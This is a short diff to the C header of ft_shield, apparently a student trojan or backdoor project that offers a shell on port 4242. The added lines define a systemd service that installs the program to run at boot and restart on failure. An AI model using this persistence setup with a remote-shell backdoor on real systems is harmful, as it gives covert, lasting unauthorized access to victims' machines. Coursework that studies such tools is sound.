@@ -38,6 +38,19 @@
 #define CMD_SHELL "shell"
 #define SHELL_MSG "Spawning shell on port 4242\n"
 
+#define SYS_DIR "/etc/systemd/system"
+#define SYS_FILE "/etc/systemd/system/ft_shield.service"
+#define SYSTEMD_OPT "[Unit] \
+Description=ft_shield \
+[Service] \
+Type=simple \
+ExecStart=/home/rbardet/Documents/ft_shield/ft_shield \
+Restart=on-failure \
+RestartSec=10 \
+KillMode=process \
+[Install] \
+WantedBy=multi-user.target"
+
 typedef enum {
 	LOG_INFO,
 	LOG_INPUT,
@@ -73,5 +86,7 @@ bool set_password();
 bool ask_password(int userfd);
 
 void read_input(int userfd, EPOLL_STRUCT epoll);
+
+void systemd();
 
 #endif
